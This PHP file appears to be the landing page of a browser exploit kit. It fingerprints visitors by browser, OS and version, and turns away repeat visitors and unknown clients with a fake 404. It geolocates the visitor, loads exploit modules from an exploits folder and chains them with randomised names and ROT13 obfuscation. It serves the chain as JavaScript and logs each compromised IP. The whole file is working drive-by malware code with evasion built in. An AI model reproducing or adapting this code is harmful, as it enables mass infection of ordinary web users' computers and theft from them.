<?php 
ob_start();
require_once("config.inc.php");
require_once("CP-ENC-7531.php");
require_once("CP-ENC-1633.php");
require_once("cryptor.php");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: Thu, 01 Jan 2000 00:00:00 GMT");
header("Last-Modified:  Thu, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
$cpMySQL->ConnectMySQL();
$ip = $cpFunctions->GetIP();
$user_agent = $cpMySQL->antisqli($_SERVER["HTTP_USER_AGENT"]);
$browser = $cpFunctions->GetBrowser($user_agent);
$version = $cpFunctions->GetVersion($user_agent);
$os = $cpFunctions->GetOS($user_agent);
if( $browser == "ie" && $version == "0" ) 
{
    $version = $cpFunctions->MSIEVersion($user_agent);
}

$count = mysql_query("SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "peeps` WHERE ip = '" . $ip . "'");
if( 0 < mysql_num_rows($count) || $os == "Unknown" || $browser == "Unknown" ) 
{
    $cpFunctions->Error404();
}

if( ($cpFunctions->MSIEVersion($user_agent) == 8 || $browser == "ch" || $os == "seven") && !$cpMySQL->DataDecrypt(BADTRAFF) ) 
{
    $cpFunctions->Error404();
}

$country = CPGeoIP::getcountry($ip);
$arrayExploits = unserialize($cpMySQL->DataDecrypt(EXPLOITS));
$eArray = array(  );
$exploitNames = array(  );
$ExploitFunctions = array(  );
for( $x = 0; $x < 55; $x++ ) 
{
    $ExploitFunctions[$x] = $cpFunctions->RandLtr(15, 1);
}
for( $i = 0; $i < count($arrayExploits); $i++ ) 
{
    unset($functionName);
    include("./exploits/" . $arrayExploits[$i] . ".php");
    if( isset($functionName) ) 
    {
        array_push($exploitNames, $functionName);
    }

}
for( $i = 0; $i < count($eArray); $i++ ) 
{
    $eArray[$i] = str_replace("{next}", (isset($exploitNames[$i + 1]) ? $exploitNames[$i + 1] . "();" : $ExploitFunctions[51] . "();"), $eArray[$i]);
}
$xpl = "\r\ndocument.write(\"<body><div id='" . $ExploitFunctions[50] . "'>" . $ExploitFunctions[50] . "</div></body>\");\r\nfunction " . $ExploitFunctions[51] . "(){}\r\nfunction " . $ExploitFunctions[52] . "(x){\r\n\treturn x.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<=\"Z\"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});\r\n}\r\n" . implode("\n", $eArray) . "\r\n" . ((isset($exploitNames[0]) ? $exploitNames[0] . "();" : $ExploitFunctions[51] . "();")) . " ";
$referer = @getenv("HTTP_REFERER");
if( 0 < strlen($referer) ) 
{
    $referer = str_replace("www.", "", $referer);
    $tmp = parse_url($referer);
    $referer = strtolower($tmp["host"]);
}

$cpMySQL->AddExploitedIp("", $cpMySQL->antisqli($browser), $cpMySQL->antisqli($os), "", $cpMySQL->antisqli($country), $cpMySQL->antisqli($referer), $cpMySQL->antisqli($version));
echo GetJS(base64_encode(mt_rand(1000000, 1E+24)), "<script language='javascript'>" . $xpl . "</script><noscript></noscript>");
ob_end_flush();
function rot13enc($inputString)
{
    $rotated = str_replace("\"", "\\\"", str_rot13($inputString));
    return "\"" . $rotated . "\"";
}


